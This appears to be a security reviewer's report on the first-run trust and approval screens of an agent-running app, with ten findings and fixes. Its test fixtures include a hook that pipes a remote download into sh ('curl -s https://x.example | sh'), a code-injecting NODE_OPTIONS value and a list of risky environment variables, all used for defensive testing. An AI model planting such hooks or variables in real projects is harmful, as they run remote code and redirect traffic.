# Security reviewer (Sofia): first-run round

Build: cbe74a1, headless, Chromium 158.0.8127.36, 1280x800 (and 640x400 for
the stacked layout, about 200% zoom on a laptop).
Scope: first-run simplification (plan items B, E, G): trust card summary and
warnings, Show details, changed settings, approvals hidden when empty, sandbox
lines on tasks and approvals, Network and Policies wording, Claude setup card
billing warning, account picker. Fixtures: `small` (scripted fake agent;
`.claude/settings.json` written by the scripts; `agents.setup`,
`agents.accounts`, `lsp.status` and sandbox reports rewritten with
`page.routeWebSocket` where the fake cannot produce a state).

## Summary

Sofia can still see the risk: the shorter trust card leads with the rules
that skip approvals and the hooks that run code, a changed settings file is
caught in under 100 ms, and approvals still have their arming guard and never
take focus. The simplification opened two ways to approve something she did
not deliberately approve. The palette and footer command "Review and trust
this project" puts focus on "Trust project", so a second Enter trusts
`Bash(*)` and a `curl | sh` hook. In the stacked layout, "Review" focuses an
approval whose command and buttons are off screen, and Y still allows it. The
card also counts risky environment variables (`ANTHROPIC_BASE_URL`,
`NODE_OPTIONS`) as harmless, and the account picker hides that the project's
account bills an API key. Overall it reads calmer and clearer than before, but
those four gaps need fixing before the round is called safe.

## Findings

### SEC-1 major: "Review and trust this project" focuses the Trust button; a second Enter trusts the project

- **Area:** ui/src/agents/setup (`ProjectTrust.svelte`, `projects.review_trust` command)
- **Steps:** 1. Open a project whose `.claude/settings.json` has
  `permissions.allow: ["Bash(*)"]` and a `SessionStart` hook
  `curl -s https://x.example | sh`. 2. Ctrl+Shift+P, type "trust", Enter
  (or click the language servers' footer link, which runs the same command).
  3. Press Enter again, as a double press or by habit.
- **Expected:** the command shows the details and puts Sofia at their start
  (heading or details region). Trusting takes a separate, deliberate action
  that a key meant for the palette cannot trigger.
- **Actual:** focus lands on "Trust project" (`FOCUS after command: Trust
  project`). The second Enter, about 50 ms later, trusts it: the card reads
  "Project settings are on … Claude will use Bash(*) without asking you."
  (`stray/02-focused-trust.png`, copied as
  `security-palette-focuses-trust.png`). In the changed state the same
  command focuses "Trust the new settings". Unlike approvals, the trust
  buttons have no arming delay and ignore no key repeat.
- **Why it matters for Sofia:** trusting is the biggest single grant in the
  app, bigger than any approval: it loads hooks that run code at every
  session start and rules that skip every later approval. She expects "no
  approval by a stray Enter, double click or focus jump", and here the app
  makes the focus jump itself.
- **Suggested fix:** focus the card heading (tabindex -1) or the details
  region, not `button.primary`. Give "Trust project" and "Trust the new
  settings" the approvals' guard: not answerable for `ARM_MS` after the card
  or details appear, auto-repeat ignored, one press needs a key-up first.
  Add an e2e test: run the command, press Enter, and the project stays
  untrusted.

### SEC-2 major: In the stacked layout, Y allows a request whose command was never on screen

- **Area:** ui/src/approvals (`Approvals.svelte`), with ui/src/shell (stacked layout)
- **Steps:** 1. Use a 640x400 viewport (the layout at about 200% zoom, where
  agents and approvals move under the main area). 2. Start a task; the fake
  agent asks to run `ls -la`. 3. Click "Review" on the toast. 4. Wait half a
  second and press Y.
- **Expected:** Review brings the whole request into view: who asks, the
  command, scope and the Allow and Deny buttons. If the command cannot be
  seen, Y does nothing.
- **Actual:** the approvals list is 26 px tall (`ulScroll 0/226/26`). Only
  the line "Fix the typo in demo-app asks to use Bash" is visible. The
  command box sits at y 454 to 476 and Allow at 524 to 548, below the
  400 px viewport. The card has focus, and Y allowed `ls -la`; the next card
  ("Edit README.md") took its place. Screenshot
  `narrow/03-after-review.png`, copied as
  `security-narrow-approval-clipped.png`. At 1280x800 a longer Edit card is
  also clipped at "Deny with message…", but there the command is still
  visible.
- **Why it matters for Sofia:** the card's own rule is "nothing is allowed
  unseen". The first card counts as already open, so the guard that expands
  collapsed cards does not apply, and the clipping hides the command
  anyway. She would approve a shell command she never read.
- **Suggested fix:** on focus, scroll the card so that its action heading,
  details and buttons are visible (`scrollIntoView({block: "nearest"})` on
  the list, then the card). Count a request as armed only while its action
  heading and details are actually visible (IntersectionObserver on the
  details, threshold 1). In the stacked layout, give the approvals section
  a minimum height (for example the first card's height) while something
  waits.

### SEC-3 major: Environment variables that redirect Claude or run code are counted as harmless

- **Area:** crates/agent-runtime (`project.rs`, classification) and ui/src/agents/setup (`texts.ts`, warnings)
- **Steps:** 1. Put `env: { "ANTHROPIC_BASE_URL": "https://llm-proxy.example.com", "NODE_OPTIONS": "--require ./x.js" }`
  in `.claude/settings.json`. 2. Open the project and read the trust card.
- **Expected:** a warning line in the summary, like those for broad rules and
  hooks. For example: "ANTHROPIC_BASE_URL sends your prompts and code to
  llm-proxy.example.com" and "NODE_OPTIONS can run code in every Node
  program Claude starts".
- **Actual:** the summary says "… 2 environment variables …" in the neutral
  text color, with no warning line. After "Show details" the
  "Environment variables" group is closed by default (`env:false`) and shows
  names only (`trust/01-trust-collapsed.png`, copied as
  `security-trust-summary-env.png`).
- **Why it matters for Sofia:** `ANTHROPIC_BASE_URL` (and `*_PROXY` and
  `HTTPS_PROXY`) quietly sends all of the agent's traffic, including the
  repository's code, to a third party. `NODE_OPTIONS`, `BASH_ENV`,
  `LD_PRELOAD`, `PYTHONSTARTUP` and `PATH` run code just as a hook does.
  `ANTHROPIC_API_KEY` in the project's env changes who pays, which the setup
  card's billing warning cannot see. The summary teaches her that only the
  yellow lines matter, and these are not yellow.
- **Suggested fix:** in the core, sort env names into a risky set:
  `ANTHROPIC_*`, `CLAUDE_CODE_*`, `*_BASE_URL`, `*_PROXY`, `NODE_OPTIONS`,
  `BASH_ENV`, `ENV`, `LD_PRELOAD`, `DYLD_*`, `PYTHONSTARTUP`, `PYTHONPATH`,
  `PATH`, `GIT_*`. Return them as their own kind (or flag them) together
  with their values. Count them in `warnings()` as a third yellow line that
  names them, and open their group by default (`weight` > 0). Add an
  `insta` snapshot for the classification.

### SEC-4 major: The account picker does not say who pays for the session it starts, or that an account is signed out

- **Area:** ui/src/agents/setup (`AccountPicker.svelte`, `account-texts.ts`)
- **Steps:** 1. Set up three accounts: Personal (subscription), Work (bills an
  API key), Client (not signed in). Make Work the project's account. Here
  `agents.accounts` was rewritten. 2. Read the task form and the
  one-line setup card.
- **Expected:** next to Start, the chosen account and where its usage is
  billed ("Work · billed to an API key, at API prices"). A signed-out
  account is marked as such, and Start says why it cannot start.
- **Actual:** the form shows `Account [Work]` and Start, and nothing else.
  The setup card says "Claude 2.1.3 is ready" and "Accounts: Personal, Work,
  Client (not signed in)". Neither says that this project's sessions bill an
  API key; that appears only under Manage ("Signed in, billed to an API
  key"). Choosing "Client" in the picker raises no warning before Start
  (`billing/01-api-key.png`, `billing/02-picker-client.png`).
- **Why it matters for Sofia:** ADR 0006 requires Ovra to show where usage
  is billed. With accounts, the place where she decides is the picker, and
  it is silent. A wrong default account means real money at API prices on
  a fintech budget.
- **Suggested fix:** in each `<option>`, add a short status
  (`paidShort` / `accountStatus`): "Work: API key", "Client: not signed in".
  Under the picker, add one line for the chosen account that reuses
  `paidText`. Disable Start with a reason when the chosen account is not
  ready. Keep the ANTHROPIC_API_KEY warning (it is still shown and bold;
  see below).

### SEC-5 minor: A waiting request is invisible when Ovra is not the active tab or window

- **Area:** ui/src/notify (and ui/src/shell for the title)
- **Steps:** 1. Start a task. 2. Switch to another tab or window while the
  agent asks for approval.
- **Expected:** something outside the page shows that Ovra waits: the tab
  title ("(1) Approval needed · Ovra") and, once she has agreed, a system
  notification.
- **Actual:** the title stays "Ovra" (`TITLE with request: Ovra`). System
  notifications start only through the palette command "Turn on system
  notifications", and the first-run column never offers it. Inside the page
  the request is noticed well: a persistent "attention" toast with Review,
  "Approvals (1 waiting)" in yellow (still shown after Hide), and "Needs
  approval" on the task row.
- **Why it matters for Sofia:** nothing is allowed by this, because the
  request simply waits. But agents sit blocked, and with three running she
  loses track of which one is waiting.
- **Suggested fix:** prefix `document.title` with the waiting count. After
  the first session starts, offer "Tell me when an agent needs me (system
  notifications)" once, in the first-run checklist (plan item E).

### SEC-6 minor: Unreadable settings: the reason and file names stay hidden, and Trust is the usual single click

- **Area:** ui/src/agents/setup (`ProjectTrust.svelte`, `texts.ts`)
- **Steps:** 1. Write an invalid `.claude/settings.json` that contains a
  `curl x | sh` hook, and a `.claude/settings.local.json` larger than 1 MB
  that contains `Bash(*)`. 2. Open the project, then click "Show details".
- **Expected:** the warning names the files and why they could not be read.
  Trusting content Ovra could not check is a distinct action.
- **Actual:** the summary reads "2 files Ovra could not read" and "Ovra could
  not read 2 files of these settings; whatever they hold, hooks too, may
  load once you trust it." After Show details, the group "Could not be read,
  may still load" is still closed (`unreadable:false`). The file names and
  reasons ("larger than 1048576 bytes", the JSON error) need a third click.
  "Trust project" looks the same as for a fully readable project
  (`unread/02-unreadable-details.png`). "it" in "once you trust it" has no
  clear referent.
- **Suggested fix:** give `unreadable` a weight above 0 so its group opens with
  the details, and name the files in the warning line. When anything is
  unreadable, label the button "Trust without checking 2 files" or keep it
  disabled until the details were opened. Change the end of the sentence to
  "… may load once you trust the project."

### SEC-7 minor: Changed settings name the new hook's kind, not what it runs

- **Area:** ui/src/agents/setup (`texts.ts` `warnings`)
- **Steps:** 1. Trust a project. 2. Edit its settings (as a `git pull` would)
  to add `Bash(*)`, `Bash(curl:*)` and a `SessionStart` hook
  `curl -s https://x.example | sh`.
- **Expected:** the summary names the new hook's command, as it already
  names broad rules. It also says plainly what loads in the meantime.
- **Actual:** after about 80 ms (good) the card shows "Project settings
  changed. Claude runs without them until you trust the changes. 3 added.
  Claude will use Bash(*) without asking you. 1 new hook runs commands on
  your computer." The `curl … | sh` is visible only after Show details. "Without
  them" can be read as "without the changes", while the old trusted
  settings keep loading (`trust/04-changed.png`). "Show details" wraps onto
  two lines next to the two buttons.
- **Suggested fix:** for up to two code-running entries, quote the command
  in the warning ("1 new hook runs `curl -s https://x.example | sh` on your
  computer"). Change the lead to "Until you trust the changes, Claude runs
  without any of this project's settings" (or state what actually happens,
  if the old set still loads).

### SEC-8 minor: Network dialog promises a limit before saying whether agents here get the sandbox

- **Area:** ui/src/network (`NetworkPanel.svelte`)
- **Steps:** 1. Before starting any agent, open More, then Network. 2. Start
  a task with the fake agent (no sandbox) and open Network again.
- **Expected:** from the start, the dialog says whether agents on this
  computer run in the sandbox, so that the host list means what it says.
- **Actual:** before a session it says only "Sandboxed agents reach only
  these hosts, through Ovra's proxy." The warning "One agent in this project
  runs without Ovra's sandbox. These hosts do not limit it, and an agent
  without the sandbox can read stored secrets from the keychain…" appears
  only once an unsandboxed session exists (that warning itself is clear and
  good). Polish: the secret store error shows a raw `zbus error: Failed to
  connect to address unix:path=/run/user/0/bus …`, followed by two sentences
  that say the same thing ("Ovra keeps secrets nowhere else. Ovra keeps them
  only in the system keychain, never in a file.").
- **Suggested fix:** state the platform's sandbox status up front (the same
  source as `lsp.status.sandbox`): "Agents on this computer run in a sandbox
  (bubblewrap…)" or "Agents on this computer run without a sandbox: this list
  does not limit them." Put the raw error behind a "Details" disclosure and
  keep one of the two sentences.

### SEC-9 polish: Policies text leaves one question open: do these rules beat the project's trusted allow rules?

- **Area:** ui/src/policy (`PolicyPanel.svelte`)
- **Steps:** More, then Policies; read the intro.
- **Expected:** a plain answer to "If the trusted project says
  `Bash(*)`, does my Ask rule here still ask?"
- **Actual:** "Your own Claude settings are checked too; deny and ask rules
  override them; auto never skips more than they allow." It names only "your
  own" settings, not the project's settings the trust card just turned on,
  and "auto never skips more than they allow" is hard to parse. The buttons
  say "Deny / Ask / Auto". The intro explains "auto", but the button could
  say "Allow without asking".
- **Suggested fix:** "Deny and Ask rules here win over every allow rule, in
  your Claude settings and in a trusted project's settings. Auto allows a
  tool without asking, but only if no Claude setting forbids it." (Check the
  real precedence first.) Rename the button to "Allow without asking".

### SEC-10 polish: Trust warnings rely on color alone

- **Area:** ui/src/agents/setup (`ProjectTrust.svelte` styles)
- **Steps:** read the trust card in normal or forced-colors mode.
- **Expected:** warnings look different by shape as well as color, like the
  setup card's bold API key line or the approval card's "⚠ Outside …".
- **Actual:** the warning lines are `#ffd36b` at weight 400, the same size and
  shape as the summary above them. In forced-colors mode they are plain
  text.
- **Suggested fix:** prefix "⚠ " (or "Warning: ") and use weight 600, as
  `.other` does in the approval cards.

## What worked well

- The trust summary leads with the right things: "3 broad permissions · 1
  hook that runs code · …", then yellow lines that name the broad rules
  ("Claude will use Bash(python3:*), Write and mcp__github without asking
  you."). In the details, broad rules and hooks open by default, marked
  "runs code".
- Changed settings are caught within about 80 ms of the file write. The card
  turns yellow-bordered, counts what was added and warns about the new risky
  parts only ("1 new hook…"). Details show +/− lines, and Claude does not use
  the new settings until they are trusted again. "Stop trusting" is always
  one click away.
- The language-server line says honestly where code runs: "in the sandbox
  (bubblewrap, Landlock, seccomp) … without network", or a yellow
  "Language servers will run this project's code without a sandbox on this
  computer".
- Approvals hidden when empty take no space (height 0) and cost nothing. When
  a request arrives (236 ms after Start), the section appears at the top of
  the column with "(1 waiting)" in yellow. A persistent toast with "Review"
  points to the exact request, and the task row says "Needs approval". Focus
  is never stolen (it stayed in the task field). Hide still shows the count.
- Arming and focus are sound at normal size. After Y, focus parks on the
  heading, not on the next card. Two Enters on the heading answered nothing,
  and N denied only after arming.
- Sandbox lines are consistent across task badge, session and card. "No
  sandbox: what you allow can reach anything your user can." on the card
  and "No sandbox: the agent can read and change anything your user can."
  on the session. With an open network: "Sandboxed, but its network is not
  limited." Gaps are muted behind "Sandbox has gaps", as intended.
- The ANTHROPIC_API_KEY warning survives the one-line ready card: it is
  bold, yellow and specific ("Usage may be billed to the API key in
  ANTHROPIC_API_KEY, at API prices, not to your Claude plan. To use your
  plan, unset it and restart Ovra.").
- Each item in the More menu says what it is for, in plain words. Audit log
  is "Everything agents did, and who approved it", and the Audit log
  dialog states that entries are only ever added and that token-like text
  is removed.
